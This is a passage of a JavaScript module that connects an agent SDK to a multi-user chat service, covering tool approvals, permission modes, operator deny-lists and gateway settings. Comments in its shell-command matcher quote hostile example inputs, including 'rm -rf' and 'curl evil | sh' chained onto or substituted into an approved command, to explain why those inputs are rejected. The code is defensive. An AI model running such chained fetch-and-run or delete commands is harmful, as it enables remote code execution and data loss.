/**
 * Claude SDK Integration
 *
 * This module provides SDK-based integration with Claude using the @anthropic-ai/claude-agent-sdk.
 * It mirrors the interface of claude-cli.js but uses the SDK internally for better performance
 * and maintainability.
 *
 * Key features:
 * - Direct SDK integration without child processes
 * - Session management with abort capability
 * - Options mapping between CLI and SDK formats
 * - WebSocket message streaming
 */

import crypto from 'crypto';
import { promises as fs } from 'fs';
import os from 'os';
import path from 'path';

import { query } from '@anthropic-ai/claude-agent-sdk';

import { createLogger } from '@/shared/logger.js';

import { AUTO_COMPACT_MARGIN } from '../shared/modelVendors.js';

import { buildClaudeUserContent, normalizeImageDescriptors } from './shared/image-attachments.js';
import {
  changedFilesSince,
  createCheckpoint,
  isGitRepository,
  pruneCheckpoints,
  updateCheckpointSession
} from './services/git-checkpoint.js';
import {
  detectTestCommand,
  parseLoopCommand,
  runTestCommand
} from './services/agent-loop.js';
import { CLAUDE_FALLBACK_MODELS } from './modules/providers/list/claude/claude-models.provider.js';
import { providerModelsService } from './modules/providers/services/provider-models.service.js';
import { ModelNotAllowedError, claudeModelCatalog, modelViewerFor, subagentModelEnv } from './modules/providers/list/claude/claude-model-catalog.service.js';
import { logGatewayResolution, resolveTurnGateway } from './modules/providers/list/claude/claude-gateways.service.js';
import { removeFlagSettingsFile, writeFlagSettingsFile } from './modules/providers/list/claude/claude-flag-settings-file.js';
import { sdkExecutableOption } from './shared/claude-cli-path.js';
import { CROSS_SESSION_INBOUND, CROSS_SESSION_TOOLS, buildClaudeSdkEnv } from './shared/claude-runtime-env.js';
import { usernameKey } from './shared/root-users.js';
import {
  createNotificationEvent,
  notifyRunFailed,
  notifyRunStopped,
  notifyUserIfEnabled
} from './services/notification-orchestrator.js';
import { modelTurnStatsDb, usageRecordsDb } from './modules/database/index.js';
import { sessionsService } from './modules/providers/services/sessions.service.js';
import { providerAuthService } from './modules/providers/services/provider-auth.service.js';
import { createCompleteMessage, createNormalizedMessage, generateMessageId } from './shared/utils.js';

const log = createLogger('sdk');

const activeSessions = new Map();
const pendingToolApprovals = new Map();
// Sessions cancelled via abort-session. The abort handler already sent the
// terminal `complete` (aborted: true) to the client, so the run loop must not
// emit a second one when its generator winds down.
const abortedSessionIds = new Set();

/**
 * 审批请求的等待时长,默认 0 = 一直等。
 *
 * 审批帧是否送达无从得知:`ChatSessionWriter.forward()` 在 socket 不是 OPEN 时静默丢弃,
 * 掉线、切标签页、或帧落到另一个抢走 writer 的浏览器时,超时会替用户拒绝一个他从没看见的请求。
 * 恢复机制也都比短超时慢:客户端沉默 60 秒才重连,服务端心跳 30 秒一轮、通常两轮才判定 socket 僵死。
 *
 * 中止交给真正做了决定的一方:用户点停止(turn 的 AbortSignal)、turn 看门狗(见 readTurnWatchdogConfig)、
 * 会话销毁,都走 `signal` 分支返回 `{ cancelled: true }`。需要超时拒绝时设 CLAUDE_TOOL_APPROVAL_TIMEOUT_MS。
 */
const TOOL_APPROVAL_TIMEOUT_MS = parseInt(process.env.CLAUDE_TOOL_APPROVAL_TIMEOUT_MS, 10) || 0;

/**
 * 一次性路径上非交互工具的审批等待上限。
 *
 * 常驻 runtime 的审批可以一直等:卡住的一轮由 turn 看门狗以取消收场(见 readTurnWatchdogConfig)。
 * 一次性路径要有自己的上限,免得没人回答的审批把 SDK 进程和一次性名额长期占住。
 * 默认 1 小时;显式配置了 PRISM_TURN_TIMEOUT_MS(常驻路径的绝对上限,默认关闭)时取同一个值。
 */
const ONESHOT_APPROVAL_TIMEOUT_MS = (() => {
  const parsed = parseInt(process.env.PRISM_TURN_TIMEOUT_MS, 10);
  if (Number.isFinite(parsed) && parsed > 0) return parsed;
  if (Number.isFinite(parsed) && parsed === 0) return 0; // 显式配 0:不设上限
  return 3600000; // 未配置时的默认值,不跟随常驻路径的绝对上限(其默认为关)
})();

/**
 * `PRISM_FORCED_DENY_TOOLS`:运维强制禁用的工具,逗号分隔。
 *
 * 每次调用都现读环境变量、不缓存:一轮只读一次,不在热路径上,也避免某处缓存旧值。
 */
export function readForcedDenyTools(env = process.env) {
  const raw = typeof env.PRISM_FORCED_DENY_TOOLS === 'string' ? env.PRISM_FORCED_DENY_TOOLS : '';
  return raw.split(',').map((name) => name.trim()).filter(Boolean);
}

/**
 * `PRISM_ALLOW_BYPASS_USERS`:允许使用 bypassPermissions 的用户名。
 *
 * 返回 `null` 表示没有配置,即不限制;返回空 Set 表示配了但为空,即谁都不许。两者必须分开表示。
 *
 * 比对键用 `usernameKey`,与 `isRootUser` 同口径(只折叠 ASCII 大小写,与 users.username 的
 * COLLATE NOCASE 一致),否则会出现「配了 Alice,alice 却不在名单里」。
 */
export function readBypassAllowlist(env = process.env) {
  const raw = env.PRISM_ALLOW_BYPASS_USERS;
  if (typeof raw !== 'string' || !raw.trim()) return null;
  return new Set(raw.split(',').map((name) => usernameKey(name)).filter(Boolean));
}

/**
 * 「跳过权限」档位在 root 下会被 CLI 拒绝,这里提前给出说明,而不是让子进程 exit 1。
 *
 * CLI 的硬检查:
 *
 * ```js
 * if (mode === "bypassPermissions" || flag) {
 *   if (process.getuid?.() === 0 && process.env.IS_SANDBOX !== "1" && !CLAUDE_CODE_BUBBLEWRAP) {
 *     log.error("--dangerously-skip-permissions cannot be used with root/sudo privileges for security reasons");
 *     process.exit(1);
 *   }
 * }
 * ```
 *
 * 只有这一个档位受影响,其余档位在 root 下照常工作。失败时子进程直接以退出码 1 退出,没有其它信息。
 *
 * @param {string} permissionMode 本轮实际生效的权限模式
 * @returns {string|null} 给用户看的说明;没问题时为 null
 */
export function describeBypassUnderRoot(permissionMode) {
  if (permissionMode !== 'bypassPermissions') return null;
  if (typeof process.getuid !== 'function' || process.getuid() !== 0) return null;
  if (process.env.IS_SANDBOX === '1' || process.env.CLAUDE_CODE_BUBBLEWRAP) return null;

  return '当前服务以 root 运行，而「跳过权限」这个执行档位被 Claude CLI 拒绝'
    + '（原话：--dangerously-skip-permissions cannot be used with root/sudo privileges）。\n\n'
    + '两个办法：\n'
    + '· 换一个执行档位 —— 默认 / 计划 / 接受编辑 / 自动 这四个在 root 下都正常。\n'
    + '· 或者让运维在 Prism 的 .env 里设 `IS_SANDBOX=1` 后重启，'
    + '这会放行该档位（代价见 .env.example 里的说明）。';
}

/** 审批没等到回答时的说法 —— 说清楚是"没人回答",而不是含糊的"超时"。 */
const APPROVAL_UNANSWERED_MESSAGE =
  '这条工具权限请求一直没有人回应，已按拒绝处理。'
  + '（如果你从没见过这个确认框：它只在你正**在看**该会话时才会弹出，'
  + '侧栏该会话左侧的红点就是它在等你的提示。）';

const TOOLS_REQUIRING_INTERACTION = new Set(['AskUserQuestion', 'ExitPlanMode']);

/**
 * 发一条审批请求,并返回它送达了几个浏览器。
 *
 * 内容帧丢了有补发游标兜底,审批请求是一个在等人回答的问题,所以要知道有没有人收到。
 * 送达 0 个时请求照样挂着(默认不超时),等用户重连或切回该会话,由 `chat_subscribed` 的
 * pendingPermissions 补发;这里记一条日志,方便排查「为什么没弹窗」。
 *
 * @returns {number} 送达的订阅者数量;拿不到投递信息时返回 -1(未知)
 */
function sendPermissionRequest(writer, message, { toolName, sessionId }) {
  if (typeof writer?.sendAndCountDelivered === 'function') {
    const delivered = writer.sendAndCountDelivered(message);
    if (delivered === 0) {
      log.warn(
        `[Claude SDK] 审批请求没有送达任何浏览器 (tool=${toolName}, session=${sessionId || 'none'}) —— `
        + '会一直挂着,等用户重连或切回该会话时由 pendingPermissions 补上。',
      );
    }
    return delivered;
  }

  // 内部路径(prewarm、agent loop)拿到的可能是别的 writer,退回即发即忘。
  writer.send(message);
  return -1;
}

/** claude CLI stderr 只留最后这么多行。 */
const STDERR_TAIL_LINES = 40;

/**
 * 收集 claude CLI 子进程的 stderr。
 *
 * 子进程一起来就失败时,SDK 只抛 `Claude Code process exited with code 1`;真正的原因
 * (CLI 没装、认证过期、`~/.claude/settings.json` 语法错误、磁盘满、CLI 与 SDK 版本不兼容)
 * 都在 stderr 里,必须接上 SDK 的 `stderr` 回调才拿得到。
 *
 * 只留最后几十行:CLI 在 debug 模式下会大量输出,失败原因总在末尾。
 */
function createStderrTail() {
  /** @type {string[]} */
  const lines = [];

  const onData = (chunk) => {
    const text = typeof chunk === 'string' ? chunk : String(chunk ?? '');
    if (!text) return;
    for (const line of text.split(/\r?\n/)) {
      if (!line.trim()) continue;
      lines.push(line);
      if (lines.length > STDERR_TAIL_LINES) lines.shift();
    }
  };

  return {
    onData,
    text: () => lines.join('\n'),
    /**
     * 把 stderr 尾部附到错误消息后面:聊天里的 error 是用户唯一看得到的地方,要带上真实原因。
     */
    describe(error) {
      const base = error instanceof Error ? error.message : String(error);
      if (!lines.length) return base;
      return `${base}\n\n--- claude CLI stderr(最后 ${lines.length} 行)---\n${lines.join('\n')}`;
    },
  };
}

function resolveClaudeEffort(model, effort, modelsDefinition = CLAUDE_FALLBACK_MODELS) {
  const selectedModel = modelsDefinition?.OPTIONS?.find((option) => option.value === model) || null;
  const allowedEfforts = selectedModel?.effort?.values
    ?.map((value) => value.value) || [];
  return typeof effort === 'string' && effort !== 'default' && allowedEfforts.includes(effort)
    ? effort
    : undefined;
}

function createRequestId() {
  if (typeof crypto.randomUUID === 'function') {
    return crypto.randomUUID();
  }
  return crypto.randomBytes(16).toString('hex');
}

function waitForToolApproval(requestId, options = {}) {
  const { timeoutMs = TOOL_APPROVAL_TIMEOUT_MS, signal, onCancel, metadata } = options;

  return new Promise(resolve => {
    let settled = false;

    const finalize = (decision) => {
      if (settled) return;
      settled = true;
      cleanup();
      resolve(decision);
    };

    let timeout;

    const cleanup = () => {
      pendingToolApprovals.delete(requestId);
      if (timeout) clearTimeout(timeout);
      if (signal && abortHandler) {
        signal.removeEventListener('abort', abortHandler);
      }
    };

    // timeoutMs 0 = wait indefinitely
    if (timeoutMs > 0) {
      timeout = setTimeout(() => {
        onCancel?.('timeout');
        finalize(null);
      }, timeoutMs);
    }

    const abortHandler = () => {
      onCancel?.('cancelled');
      finalize({ cancelled: true });
    };

    if (signal) {
      if (signal.aborted) {
        onCancel?.('cancelled');
        finalize({ cancelled: true });
        return;
      }
      signal.addEventListener('abort', abortHandler, { once: true });
    }

    const resolver = (decision) => {
      finalize(decision);
    };
    // 供外部清扫用的取消入口:先走 onCancel 发 `permission_cancelled` 让前端收起确认框,
    // 再 finalize 让等待方拿到「已取消」。直接调 resolver 不会通知前端,框会留在界面上点不动。
    resolver._cancel = (reason) => {
      if (settled) return;
      onCancel?.(reason);
      finalize({ cancelled: true });
    };
    // Attach metadata for getPendingApprovalsForSession lookup
    if (metadata) {
      Object.assign(resolver, metadata);
    }
    pendingToolApprovals.set(requestId, resolver);
  });
}

/**
 * 取消某段对话(app 会话 id)上的所有待批请求;回合 / runtime 结束时调用
 * (failActiveTurn、disposePersistentRuntime)。
 *
 * `pendingToolApprovals` 只在 waitForToolApproval 的 cleanup 里删除,常驻路径的审批默认不超时,
 * 唯一出口是 SDK 的 `context.signal`。子进程自己退出或走 query.close() 时 signal 不一定触发,
 * resolver 就会永久留在全局 Map 里;而补发按对整段对话稳定的 app 会话 id 匹配,这个死请求
 * 会在每次订阅时被当作待批推给用户,点了也没有人在 await。
 */
function cancelPendingApprovalsForSession(appSessionId, reason = 'cancelled') {
  if (!appSessionId) return 0;
  let cancelled = 0;
  for (const [, resolver] of pendingToolApprovals.entries()) {
    if (resolver?._appSessionId !== appSessionId) continue;
    try {
      resolver._cancel?.(reason);
      cancelled += 1;
    } catch { /* 单条失败不影响其余 */ }
  }
  if (cancelled > 0) {
    log.warn(`[Claude SDK] Cancelled ${cancelled} pending tool approval(s) for session ${appSessionId} (${reason})`);
  }
  return cancelled;
}

/**
 * 一条待批请求用哪个会话 id 做授权判定:provider 原生 id 优先,app 会话 id 兜底。
 *
 * 新会话第一轮里,canUseTool 可能在 provider session id 被捕获之前触发,这条请求的 `_sessionId`
 * 就永远是 null;只认 `_sessionId` 的话,用户点「允许」时 handlePermissionResponse 会直接丢弃,
 * 请求一直挂到 turn 看门狗。必须与显示 / 补发路径的 `approvalBelongsToSession` 认同一套 id。
 *
 * @param {{_sessionId?: unknown, _appSessionId?: unknown}|null|undefined} resolver
 * @returns {string|null}
 */
export function preferredApprovalSessionId(resolver) {
  if (!resolver) return null;
  if (typeof resolver._sessionId === 'string' && resolver._sessionId) return resolver._sessionId;
  if (typeof resolver._appSessionId === 'string' && resolver._appSessionId) return resolver._appSessionId;
  return null;
}

/**
 * 某个待批请求挂在哪个会话上,用于鉴权:`chat.permission-response` 只带 requestId 不带会话,
 * 不反查的话任何已登录的 socket 都能替别人的会话点「允许」。
 * 返回 null 表示这个 requestId 已不存在(超时 / 已回答 / 从未有过)。
 */
function getToolApprovalSessionId(requestId) {
  return preferredApprovalSessionId(pendingToolApprovals.get(requestId));
}

function resolveToolApproval(requestId, decision) {
  const resolver = pendingToolApprovals.get(requestId);
  if (resolver) {
    resolver(decision);
  }
}

/**
 * 一段子命令是不是这条被批准的命令(或它带参数的形式)。
 *
 * 不能用裸 `startsWith`,否则 `git statusXYZ`、`git status-hack` 也算命中 `git status`;
 * 前缀之后必须是结尾或空白。
 */
function matchesCommandPrefix(segment, allowedPrefix) {
  if (!segment.startsWith(allowedPrefix)) return false;
  const rest = segment.slice(allowedPrefix.length);
  return rest.length === 0 || /^\s/.test(rest);
}

// Match stored permission entries against a tool + input combo.
// This only supports exact tool names and the Bash(command:*) shorthand
// used by the UI; it intentionally does not implement full glob semantics,
// to stay consistent with the UI's "Allow rule" format.
function matchesToolPermission(entry, toolName, input) {
  if (!entry || !toolName) {
    return false;
  }

  if (entry === toolName) {
    return true;
  }

  const bashMatch = entry.match(/^Bash\((.+):\*\)$/);
  if (toolName === 'Bash' && bashMatch) {
    const allowedPrefix = bashMatch[1];
    let command = '';

    if (typeof input === 'string') {
      command = input.trim();
    } else if (input && typeof input === 'object' && typeof input.command === 'string') {
      command = input.command.trim();
    }

    if (!command) {
      return false;
    }

    /**
     * 每一段子命令都要命中,不能整串前缀匹配:否则批准 `git status` 生成的 `Bash(git status:*)`
     * 会自动放行 `git status; rm -rf x`、`git status && curl evil | sh`。
     * 拆分只按 shell 控制操作符,不试图理解完整的 shell 语法。
     *
     * 含命令替换 / 进程替换(反引号、`$()`、`<()`、`>()`)的一律不放行:它们能在
     * 「看起来是这条命令」的外壳里执行任意内容,例如 `git status $(curl evil)`。
     */
    if (/\$\(|`|<\(|>\(/.test(command)) {
      return false;
    }
    return splitShellSegments(command).every((segment) => matchesCommandPrefix(segment, allowedPrefix));
  }

  return false;
}

export function matchesCommandPrefixForTest(segment, allowedPrefix) { return matchesCommandPrefix(segment, allowedPrefix); }

/**
 * 把一条 shell 命令按控制操作符拆成子命令。
 *
 * 只认 `;` `&&` `||` `|` `&` 和换行,这几个是「再跑一条命令」的入口。引号里的同名字符不算
 * (`echo "a; b"` 是一条命令),所以要跟踪引号状态。
 */
export function splitShellSegments(command) {
  const segments = [];
  let current = '';
  let quote = null;
  for (let i = 0; i < command.length; i += 1) {
    const ch = command[i];
    if (quote) {
      // 反斜杠转义只在双引号里生效(单引号里反斜杠是字面量)
      if (quote === '"' && ch === '\\' && i + 1 < command.length) {
        current += ch + command[i + 1];
        i += 1;
        continue;
      }
      if (ch === quote) quote = null;
      current += ch;
      continue;
    }
    if (ch === '"' || ch === "'") {
      quote = ch;
      current += ch;
      continue;
    }
    const two = command.slice(i, i + 2);
    if (two === '&&' || two === '||') {
      segments.push(current);
      current = '';
      i += 1;
      continue;
    }
    if (ch === ';' || ch === '|' || ch === '&' || ch === '\n') {
      segments.push(current);
      current = '';
      continue;
    }
    current += ch;
  }
  segments.push(current);
  // 空段(`a;;b`、结尾的 `;`)不参与判定 —— 它们不执行任何东西。
  const meaningful = segments.map((segment) => segment.trim()).filter(Boolean);
  return meaningful.length > 0 ? meaningful : [command.trim()];
}

/**
 * 查「这条会话下一轮用哪个模型」时用的 id:app 会话 id 优先,拿不到才退回 provider 原生 id。
 *
 * 写入侧是 `POST /:provider/sessions/:sessionId/active-model`,路由里的 sessionId 是前端给的 app 会话 id;
 * `options.sessionId` 装的是 provider_session_id,网页会话里两者必然不同。用后者去读,换过的模型永远
 * 命中不了,下一轮回落默认模型,而界面(getCurrentActiveModel 按 app id 读)显示已生效。
 * 所有入口(常驻、一次性、runAgentLoop、预热)都经这里取 id,判据只有一份。
 */
function modelLookupSessionId(options = {}) {
  const runId = typeof options.runId === 'string' ? options.runId.trim() : '';
  if (runId) return runId;
  const nativeId = typeof options.sessionId === 'string' ? options.sessionId.trim() : '';
  return nativeId || undefined;
}

/**
 * 别名 → 实际下发给 CLI 的 model 参数;'default' 档不下发(返回 null)。
 *
 * CLI 不把 'default' 当别名解析,而是原样透传给网关,落进网关对陌生名字的兜底路由,与 settings.json
 * 的 "model" 配置链无关。省略 model 时 CLI 才走自己的配置链(settings.json "model" → ANTHROPIC_MODEL →
 * 内置默认),chat 与终端的「默认」因此一致。
 */
function toSdkModel(model) {
  const normalized = typeof model === 'string' ? model.trim() : '';
  if (!normalized || normalized === 'default') return null;
  return normalized;
}

/**
 * 引导模型开工前先列出完整的任务清单。
 *
 * 右侧「进度」是个时间轴(当前步骤高亮、较早的折起来),前提是清单一开始就完整:做一步建一条的话,
 * 时间轴永远只有当前这一步,看不出还剩多少。这段话追加在 claude_code 预设系统提示之后(固定文本,
 * 不影响缓存),单步小事不必建清单。任务工具(TaskCreate 一族)由 CLAUDE_CODE_ENABLE_TODO_TOOLS 打开
 * (见 claude-runtime-env),可能要先经 ToolSearch 加载。`PRISM_TASKLIST_GUIDANCE=0` 关闭。
 */
export const TASKLIST_GUIDANCE = [
  'Task list: when a request needs several steps, lay out the whole plan before doing the work —',
  'create every step you can already foresee in one go (one TaskCreate call per step, all in the same message;',
  'load the task tools with ToolSearch first if they are not available yet).',
  'Then mark each step in_progress when you start it and completed as soon as it is done, and add new tasks if more steps appear.',
  "The user follows this list as a progress timeline, so keep each step title short and in the user's language.",
  'Skip the task list for quick single-step requests.',
].join(' ');

export function presetSystemPrompt(env = process.env) {
  return env.PRISM_TASKLIST_GUIDANCE === '0'
    ? { type: 'preset', preset: 'claude_code' }
    : { type: 'preset', preset: 'claude_code', append: TASKLIST_GUIDANCE };
}

/**
 * 这一轮归属的用户:发消息的人 / 定时任务的主人 / 调 API 的账号;网关 key、「可用人员」、私有模型都按它判定。
 * 调用方(chat / 定时任务 / API)显式给 `actorUserId`;没给时退回 ownerUserId / writer 上的 userId。
 */
export function turnViewer(options = {}, ws = null) {
  const userId = [options.actorUserId, options.ownerUserId, ws?.userId]
    .find((value) => typeof value === 'number' && value > 0) ?? null;
  return modelViewerFor(userId, typeof options.actorUsername === 'string' ? options.actorUsername : null);
}

/** 档位解析用的模型表,按人构建(含私有模型的档位)。 */
function effortModelsFor(viewer) {
  try {
    return claudeModelCatalog.buildModelsDefinition(viewer);
  } catch (error) {
    log.warn('[Claude SDK] Unable to load provider models for effort validation:', error?.message || error);
    return CLAUDE_FALLBACK_MODELS;
  }
}

/**
 * 这一轮模型的运行设置:先过闸口,再查目录窗口,再解析网关。
 *
 * - 闸口:只许别名组 / 目录里上架的模型,按人看「可用人员」与私有模型。调用方要在 `resolveResumeModel`
 *   之后调用:`active-model` 写的会话级覆盖会被优先采用,只在入口查的话一个 POST 就能绕过;
 * - 窗口:别名先换真名再查(存量会话多用别名);null = 目录没填,交给 CLI 默认;
 * - 网关与 key(claude-gateways.service):个人 key > 网关默认 key > settings.json;另附按人、按网关筛过的子代理模型 env。
 *
 * 不允许时抛 ModelNotAllowedError / GatewayError(都带 `prismModelRejected`,调度器不会退回一次性路径再试)。
 */
async function modelRuntimeSettings(model, viewer = null) {
  // 别名也按「可用人员」判定(见 claudeModelCatalog.assertUsable)
  await claudeModelCatalog.assertUsable(model, viewer);
  let contextWindow = null;
  try {
    contextWindow = await claudeModelCatalog.contextWindowFor(model, viewer);
  } catch (error) {
    log.warn('[Claude SDK] 查模型目录的窗口失败,这一轮按 CLI 默认:', error?.message || error);
  }
  const gateway = await resolveTurnGateway({ model, viewer });
  logGatewayResolution(gateway, typeof model === 'string' ? model : null);
  const subagentEnv = subagentModelEnv(undefined, { viewer, gatewayId: gateway.gatewayId });
  /*
   * 非默认网关上,子代理模型的两个变量也写进 flag 层(空串 = 不设):settings.json 的 env 若写了它们,
   * 会压过进程环境里 Prism 给的值,子代理拿默认网关的模型名打到这个网关上只会 404。
   */
  if (gateway.settingsPatch && gateway.gatewayId !== 0) {
    gateway.settingsPatch.env.CLAUDE_CODE_SUBAGENT_MODEL = subagentEnv.CLAUDE_CODE_SUBAGENT_MODEL ?? '';
    gateway.settingsPatch.env.CLAUDE_CODE_SUBAGENT_MODEL_FORCE = subagentEnv.CLAUDE_CODE_SUBAGENT_MODEL_FORCE ?? '';
  }
  return { contextWindow, gateway, subagentEnv };
}

/**
 * 把这一轮的网关补丁并进 flag 层设置(优先级高于 settings.json 的 env)。
 * 补丁本身如何防串见 claude-gateways.service 的 buildGatewaySettingsPatch。
 *
 * 合并后的整份设置写进 0600 文件,`options.settings` 给路径:给对象的话 SDK 会把它序列化成
 * `--settings <json>` 放进 CLI 命令行,key 在 `ps` 里人人可见(见 claude-flag-settings-file.ts)。
 * 返回文件路径(没有补丁时返回 null,沿用对象);调用方负责在进程收尾时删除(常驻:dispose / 读循环结束;
 * 一次性:回合结束;另见 takeFlagSettingsFile)。必须是最后一个改 `sdkOptions.settings` 的地方。
 */
const flagSettingsFiles = new WeakMap();
export function applyGatewaySettings(sdkOptions, gateway) {
  const patch = gateway?.settingsPatch;
  if (!patch) return null;
  if (typeof sdkOptions.settings === 'string') {
    // 正常走不到:Prism 只在这里写路径。真出现也不能静默用错网关,宁可这一轮失败。
    throw Object.assign(new Error('options.settings 是路径字符串,无法附加网关设置'), { prismModelRejected: true });
  }
  const current = sdkOptions.settings || {};
  const merged = {
    ...current,
    apiKeyHelper: patch.apiKeyHelper,
    env: { ...(current.env || {}), ...patch.env },
  };
  const file = writeFlagSettingsFile(merged);
  sdkOptions.settings = file;
  flagSettingsFiles.set(sdkOptions, file);
  return file;
}

/** 测试用:把 settings.json 的 mtime 探针钉成某个值(null = 清掉节流,下次真去 stat)。 */
export function primeSettingsMtimeForTest(mtimeMs) {
  settingsMtimeProbe = mtimeMs === null ? { at: 0, mtimeMs: 0 } : { at: Date.now(), mtimeMs };
}

/** 测试用:删掉 applyGatewaySettings 写的文件。 */
export function removeFlagSettingsFileForTest(file) {
  removeFlagSettingsFile(file);
}

/** 一次性路径拿回 applyGatewaySettings 写的文件(拿走即解除登记)。 */
export function takeFlagSettingsFile(sdkOptions) {
  const file = flagSettingsFiles.get(sdkOptions) ?? null;
  flagSettingsFiles.delete(sdkOptions);
  return file;
}

/**
 * 按模型给子进程的上下文窗口。两个旋钮都只在进程启动时生效(见 scripts/sdk-probe 场景 5/7/9):
 *
 * | 旋钮 | 对谁生效 | 作用 |
 * |---|---|---|
 * | env `CLAUDE_CODE_MAX_CONTEXT_TOKENS` | 只对 CLI 不认识的模型名 | 设定模型窗口(可大可小) |
 * | settings `autoCompactWindow` | 所有模型(含 `claude-*`) | 有效窗口 = min(模型窗口, 它),只能往小 |
 *
 * 运行中 `applyFlagSettings({autoCompactWindow})` 在设置里读得到,但分母与压缩都不认,所以窗口不同的
 * 模型之间切换要 resume 重建(窗口计入 persistentRuntimeSignature);窗口相同照旧 `setModel`。
 *
 * 没填窗口时把继承来的 env 清掉(settings.json 的 env 里若有,那边优先;启动自检会 warn)。
 */
function modelWindowEnv(contextWindow) {
  return { CLAUDE_CODE_MAX_CONTEXT_TOKENS: contextWindow ? String(contextWindow) : undefined };
}

/**
 * ~/.claude/settings.json 的 mtime,3 秒节流。
 *
 * 模型映射(ANTHROPIC_DEFAULT_*_MODEL / "model")在这个文件里,而常驻 CLI 子进程只在启动时读它。
 * runtimeForSend 用这个指纹与 runtime 创建时的值比对,变了就懒重建(resume 续对话),
 * 改完 settings 下一条消息即生效。
 */
const USER_SETTINGS_PATH = path.join(os.homedir(), '.claude', 'settings.json');
const SETTINGS_STAT_THROTTLE_MS = 3_000;
let settingsMtimeProbe = { at: 0, mtimeMs: 0 };
async function currentUserSettingsMtimeMs() {
  const now = Date.now();
  if (now - settingsMtimeProbe.at < SETTINGS_STAT_THROTTLE_MS) return settingsMtimeProbe.mtimeMs;
  let mtimeMs = 0;
  try {
    mtimeMs = (await fs.stat(USER_SETTINGS_PATH)).mtimeMs;
  } catch {
    mtimeMs = 0; // 没有 settings.json 也是一种状态:出现/消失同样算"变了"
  }
  settingsMtimeProbe = { at: now, mtimeMs };
  return mtimeMs;
}

function mapCliOptionsToSDK(options = {}, stderrTail = null) {
  const { sessionId, newSessionId, cwd, toolsSettings, permissionMode, effort } = options;

  const sdkOptions = {};

  // Forward all host env vars (e.g. ANTHROPIC_BASE_URL) to the subprocess:
  // options.env replaces process.env instead of overlaying it.
  // 另带 CLAUDE_CODE_ENABLE_TODO_TOOLS / DISABLE_AUTOUPDATER(见 buildClaudeSdkEnv)、按模型目录给的窗口
  // (见 modelWindowEnv),以及按这一轮的人与网关筛过的子代理模型(options.subagentEnv,见 modelRuntimeSettings;
  // 子代理模型由 root 在「设置 → 模型」里设,没设时一个变量都不写,CLI 默认跟随主模型)。
  sdkOptions.env = buildClaudeSdkEnv(process.env, { ...modelWindowEnv(options.contextWindow), ...(options.subagentEnv ?? subagentModelEnv()) });

  // 接上子进程的 stderr,否则 CLI 起不来时只剩一个退出码(见 createStderrTail)。
  if (stderrTail) {
    sdkOptions.stderr = stderrTail.onData;
  }

  // 没配 `CLAUDE_CLI_PATH` 时用 SDK 随包的 CLI(与 SDK 版本锁定),由 Prism 选好、缓存后显式传入
  // (让 SDK 自己选每次都要跑 process.report);配了则按配置解析。见 sdkExecutableOption。
  sdkOptions.pathToClaudeCodeExecutable = sdkExecutableOption();

  if (cwd) {
    sdkOptions.cwd = cwd;
  }

  if (permissionMode && permissionMode !== 'default') {
    sdkOptions.permissionMode = permissionMode;
  }

  const settings = toolsSettings || {
    allowedTools: [],
    disallowedTools: [],
    skipPermissions: false
  };

  if (settings.skipPermissions && permissionMode !== 'plan') {
    sdkOptions.permissionMode = 'bypassPermissions';
  }

  /*
   * 服务端工具策略,与常驻路径共用 `applyServerToolPolicy`。
   *
   * `bypassPermissions` 意味着这一轮所有工具调用都不弹确认框,而这个档位在聊天框下拉里人人可选,
   * 定时任务的 `permission_mode` 也默认用它;客户端的权限清单存在浏览器 localStorage 里,用户随时能清空,
   * 所以「谁能用 bypass」必须由服务端决定:配了 `PRISM_ALLOW_BYPASS_USERS` 就只有名单里的人能用,
   * 没配则不限制。不在名单里的降级到 `acceptEdits` 而不是拒绝:降级只是把确认框还回来。
   */
  const policed = applyServerToolPolicy(
    sdkOptions.permissionMode,
    settings.disallowedTools,
    options.actorUsername,
    settings.allowedTools,
  );
  if (policed.permissionMode === 'default') {
    delete sdkOptions.permissionMode;
  } else {
    sdkOptions.permissionMode = policed.permissionMode;
  }

  // 用策略结果,不直接用客户端偏好(见 applyServerToolPolicy)。
  let allowedTools = [...policed.allowedTools];

  if (permissionMode === 'plan') {
    const planModeTools = ['Read', 'Task', 'exit_plan_mode', 'TodoRead', 'TodoWrite', 'WebFetch', 'WebSearch'];
    for (const tool of planModeTools) {
      if (!allowedTools.includes(tool)) {
        allowedTools.push(tool);
      }
    }
  }

  sdkOptions.allowedTools = allowedTools;

  // Use the tools preset to make all default built-in tools available (including AskUserQuestion).
  // Omitting it also exposes all tools; being explicit guards against default changes.
  sdkOptions.tools = { type: 'preset', preset: 'claude_code' };

  /*
   * 工具黑名单 = 客户端偏好(用户自己勾的,也能自己取消)+ `PRISM_FORCED_DENY_TOOLS`(运维配置,
   * 无条件并入,客户端覆盖不掉),用于在多用户部署里禁掉 `Bash`、`WebFetch` 这类能访问外部的工具。
   * 合并与去重见 applyServerToolPolicy。
   */
  sdkOptions.disallowedTools = policed.disallowedTools;

  // 'default' 档省略 model(见 toSdkModel),CLI 按 settings 配置链自选;
  // effort 仍按别名(含 'default')查表,两者口径不同是有意的。
  const sdkModel = toSdkModel(options.model);
  if (sdkModel) {
    sdkOptions.model = sdkModel;
  }

  const resolvedEffort = resolveClaudeEffort(
    options.model || CLAUDE_FALLBACK_MODELS.DEFAULT,
    effort,
    options.effortModels || CLAUDE_FALLBACK_MODELS,
  );
  if (resolvedEffort) {
    sdkOptions.effort = resolvedEffort;
  }

  // 预设系统提示 + 任务清单引导(见 TASKLIST_GUIDANCE)
  sdkOptions.systemPrompt = presetSystemPrompt();

  sdkOptions.settingSources = ['project', 'user', 'local'];
  // 自动压缩设置,与常驻路径共用同一个函数。
  applyCompactSettings(sdkOptions, { contextWindow: options.contextWindow });
  // 这一轮的网关与 key(flag 层;有补丁时写文件、给路径,调用方用 takeFlagSettingsFile 收尾)
  applyGatewaySettings(sdkOptions, options.gateway);
  /**
   * 转发子代理的完整对话,卡片里的嵌套时间轴靠它。
   *
   * SDK 文档(`Options.forwardSubagentText`):
   *
   * > Forward subagent text and thinking blocks as assistant/user messages with
   * > `parent_tool_use_id` set. By default, only tool_use/tool_result blocks from
   * > subagents are emitted (enough for a heartbeat counter). When true, the full
   * > subagent conversation is forwarded so consumers can render a nested
   * > transcript.
   *
   * 默认只拿得到子代理的工具步骤(卡片上的「N 步」),拿不到它想了什么、说了什么。
   * 打开后子代理的 prompt 与回复会以 user 帧到达,由两道判据挡在聊天顶层之外:
   *   1. `transcript-provenance.nonHumanUserTurnReason` 的 `subagent-frame`:
   *      `parent_tool_use_id` 非空即非人类帧,不渲染成用户气泡;
